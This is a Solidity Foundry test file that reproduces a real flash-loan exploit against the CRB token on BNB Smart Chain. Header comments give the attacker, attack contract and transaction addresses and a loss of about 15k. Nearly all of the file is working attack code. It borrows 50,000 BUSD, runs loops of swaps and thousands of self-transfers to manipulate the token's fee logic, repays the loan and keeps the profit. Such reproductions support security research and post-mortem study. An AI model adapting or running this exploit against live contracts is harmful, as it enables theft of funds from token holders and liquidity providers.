// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 15k
// Attacker : https://bscscan.com/address/0x65bba34c11add305cb2a1f8a68cecbd6e75089cd
// Attack Contract : https://bscscan.com/address/0x73ceea4C6571DbCf9BCc9eA77b1D8107b1D46280
// Vulnerable Contract : https://bscscan.com/address/0xee6De822159765daf0Fd72d71529d7ab026ec2f2
// Attack Tx : https://bscscan.com/tx/0xde59f5bd65e8f48e5b6137a3b4251afbb9b6240d1036fa6f030e21ab6d950aac

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xee6De822159765daf0Fd72d71529d7ab026ec2f2#code

// @Analysis
// Post-mortem : 
// Twitter Guy : 
// Hacking God : 
pragma solidity ^0.8.0;

contract crb2 is Test {
    uint256 blocknumToForkFrom = 39651175;
    address user = 0x65bBA34C11aDd305cB2A1f8A68ceCbd6E75089Cd;
    IERC20 crb_token;
    IERC20 busd;
    address pair;
    Uni_Pair_V3 flashLoan;
    IRouter router;


    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        vm.deal(user, 0.2 ether); 

        router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        crb_token = IERC20(0xee6De822159765daf0Fd72d71529d7ab026ec2f2);
        busd = IERC20(0x55d398326f99059fF775485246999027B3197955);
        pair = 0x03b051dF794b36E1767cD083fFfDEbbF573eCDA6;
        flashLoan = Uni_Pair_V3(0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4);

        busd.approve(address(router), type(uint256).max);

        crb_token.approve(address(router), type(uint256).max);


    }

    function testExploit() public {
        vm.startPrank(user,user);
        busd.approve(address(router),type(uint256).max);
        busd.approve(address(this),type(uint256).max);
        crb_token.approve(address(this), type(uint256).max);
        vm.stopPrank();
        emit log_named_decimal_uint("busd", busd.balanceOf(address(user)), 18); 

        flashLoan.flash(address(this),50000 * 1e18,0,new bytes(1));
        emit log_named_decimal_uint("busd", busd.balanceOf(address(user)), 18); 


    }

     function pancakeV3FlashCallback(uint256 fee0,uint256 fee1,bytes calldata data) public{

        address[] memory buyPath = new address[](2);
        buyPath[0] = address(busd);
        buyPath[1] = address(crb_token);

        address[] memory sellPath = new address[](2);
        sellPath[0] = address(crb_token);
        sellPath[1] = address(busd);

        for (uint256 index = 0; index < 70; index++) {
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(busd.balanceOf(address(pair))/10, 0, buyPath, address(this), block.timestamp);
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(crb_token.balanceOf(address(this)) , 0, sellPath, address(this), block.timestamp);
           
        }
        busd.transfer(address(crb_token),2000 * 1e18);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(6635861088657488493824, 0, buyPath, address(user), block.timestamp);

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(1e18, 0, buyPath, address(this), block.timestamp);
        uint256 amount = crb_token.balanceOf(address(this)) / 10000;
        for (uint256 index = 0; index < 100; index++) {
            crb_token.transfer(address(crb_token),amount);
        }
        busd.transfer(address(crb_token),2000 * 1e18);
        for (uint256 index = 0; index < 250; index++) {
            crb_token.transfer(address(crb_token),amount);
        }
        crb_token.transferFrom(user,address(this),crb_token.balanceOf(address(user)) / 2);
        crb_token.transfer(address(crb_token),crb_token.balanceOf(address(this)) - amount * 10000);
        busd.transferFrom(user,address(this),busd.balanceOf(address(user)));

        for (uint256 index = 0; index < 3000; index++) {
            crb_token.transfer(address(crb_token),amount);
        }
        
        busd.transfer(address(flashLoan),50025*1e18);
        busd.transfer(user,busd.balanceOf(address(this)));


    }


   

    
}
